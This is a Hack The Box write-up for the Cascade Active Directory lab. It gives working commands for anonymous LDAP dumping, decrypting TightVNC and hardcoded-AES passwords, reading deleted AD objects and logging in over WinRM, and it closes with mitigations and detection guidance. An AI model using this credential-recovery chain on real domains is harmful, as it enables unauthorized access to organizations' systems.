---
machine: Cascade
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, ldap, smb, vnc, dotnet, ad-recycle-bin, winrm]
---

# Cascade — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The `cascade.local` domain controller allows **anonymous LDAP bind** and returns a company-specific attribute, `cascadeLegacyPwd`, holding `r.thompson`'s password in base64. That user can read the `Data` share, where a TightVNC configuration backup stores `s.smith`'s password encrypted with the product's fixed DES key. With `s.smith` come WinRM and the hidden `Audit$` share, which holds `CascAudit.exe`, `CascCrypto.dll` and `Audit.db`: the AES key sits in the DLL and decrypts `arksvc`'s password. `arksvc` belongs to **AD Recycle Bin** and can read deleted objects, including `TempAdmin`, whose `cascadeLegacyPwd` is the same password as the domain **Administrator**.

## Recon

```bash
nmap -p- --min-rate 10000 -oA nmap_all <IP>
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -sCV -oA nmap_svc <IP>
```

```text
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: cascade.local)
445/tcp   open  microsoft-ds
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

- Host `CASC-DC1`, domain `cascade.local`, a **Windows Server 2008 R2 SP1** that has been out of support since 2020.
- Port 5985 is the way out: any account allowed to use WinRM gets a shell.
- No 80 or 443: the whole surface is directory and SMB.

```bash
echo "<IP> cascade.local CASC-DC1.cascade.local" | sudo tee -a /etc/hosts
```

## Enumeration

Anonymous LDAP bind is allowed, so the directory can be dumped without credentials:

```bash
ldapsearch -x -H ldap://<IP> -b 'DC=cascade,DC=local' -s sub '(objectClass=user)' \
  sAMAccountName description cascadeLegacyPwd
```

`cascadeLegacyPwd` is not a standard attribute: the company added it for "compatibility" with a legacy application. Its value is base64:

```bash
echo '<BASE64>' | base64 -d; echo
```

That yields **`r.thompson`**'s password. Unauthenticated SMB shows nothing useful, but that account does:

```bash
smbclient -L //<IP> -N
smbclient //<IP>/Data -U 'r.thompson%<PASSWORD>'
```

Inside `Data` the interesting file is `IT\Temp\s.smith\VNC Install.reg`, a registry backup of the administrator's TightVNC client configuration.

## Foothold

TightVNC stores the password in `Password` as hexadecimal, encrypted with **DES and a fixed key** shipped inside the product (`e84ad660c4721ae0`). It is not a hash: it reverses without brute force.

```bash
echo 6bcf2a4b6e5aca0f | xxd -r -p > vnc.bin
openssl enc -d -des-ecb -K e84ad660c4721ae0 -nopad -in vnc.bin
vncpwd 6bcf2a4b6e5aca0f        # ready-made alternative
```

The output is **`s.smith`**'s password, and that account can read `Audit$` and use WinRM:

```bash
nxc winrm <IP> -u s.smith -p '<PASSWORD>'
evil-winrm -i <IP> -u s.smith -p '<PASSWORD>'
```

Why it works: nobody rotates a VNC client password, and the registry backup was left on an IT share that half a dozen accounts can read.

## Lateral movement

`s.smith` is in the **`Audit Share`** group, which grants access to the hidden `Audit$` share:

```bash
smbclient //<IP>/Audit$ -U 's.smith%<PASSWORD>'
# get CascAudit.exe, get CascCrypto.dll, get Audit.db
sqlite3 Audit.db '.tables'
sqlite3 Audit.db 'select * from ldap;'
```

The `ldap` table stores **`arksvc`**'s password encrypted. The key is not far away: `CascCrypto.dll` exposes `Crypto.DecryptString(pwd, key)` with the AES key hardcoded. Open it with dnSpy/ILSpy, find the constant and decrypt:

```csharp
Crypto.DecryptString("<CIPHERTEXT>", "c4scadek3y654321")
```

The result is `arksvc`'s password, and that account also logs in over WinRM:

```bash
evil-winrm -i <IP> -u arksvc -p '<PASSWORD>'
```

## Privilege escalation

`arksvc` is a member of **`AD Recycle Bin`**, the group allowed to read deleted directory objects. A deleted object keeps its attributes, custom ones included:

```powershell
whoami /groups | Select-String "Recycle"
Get-ADObject -filter 'isDeleted -eq $true -includeDeletedObjects -property *' |
  Select-Object Name, sAMAccountName, cascadeLegacyPwd
```

`TempAdmin` shows up, a temporary account that was deleted instead of disabled. Its `cascadeLegacyPwd` is base64 again; decoding it gives the domain **Administrator** password, because the temporary account was created by copying the administrator's.

```bash
echo '<BASE64>' | base64 -d; echo
evil-winrm -i <IP> -u Administrator -p '<PASSWORD>'
```

Alternative if the attribute were missing: `Restore-ADObject` on the deleted entry and read its properties once restored, same result with more noise in the directory.

## Evidence

- Trimmed LDAP dump showing the attribute name, not its value.
- `base64 -d` and `openssl` output with the password removed.
- `whoami /groups` showing `AD Recycle Bin` and the list of deleted objects.
- No flags, no passwords and no `Audit.db` contents.

## Lessons learned

- A "legacy" LDAP attribute is a credential in clear text under another name: find it with `ldapsearch` and decode it.
- Remote-client configuration backups (VNC, RDP, FTP) are credentials: VNC encryption is reversible by design.
- Read the IT shares before attacking the domain; `Audit$` was the missing step and never shows up in a plain `smbclient -L`.
- Reversing a 20-line .NET DLL costs less than any directory attack.
- `AD Recycle Bin` is not a read-only group: it means persistence and secret recovery.

## Mitigations and detection

- Disallow anonymous LDAP bind and audit custom attributes that hold secrets.
- Rotate VNC passwords, keep registry backups off user shares, and use LAPS for local accounts.
- Never leave deleted accounts with valid passwords: disable and rotate before deleting, and clear sensitive attributes.
- Restrict `AD Recycle Bin` to audited administrative accounts; the group exists for administrators, not services.
- Detection: anonymous LDAP queries (event 2889 on the DC), reads of `cascadeLegacyPwd` (4662 on the object), hidden `Audit$` share access (5140/5145), and deleted-object enumeration with `Get-ADObject -includeDeletedObjects` (4688 with that command line or Sysmon 1).

MITRE: T1087.002 (domain account discovery), T1552.001 (credentials in files), T1555 (credentials from password stores), T1078.002 (domain accounts), T1021.006 (WinRM).

## References

- <https://www.hackthebox.com/machines/cascade>
- <https://thehacksparrow.com/cascade>
- <https://fahmifj.github.io/ctf/hackthebox/cascade>
- <https://blog.raw.pm/en/HackTheBox-Cascade-write-up>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin>
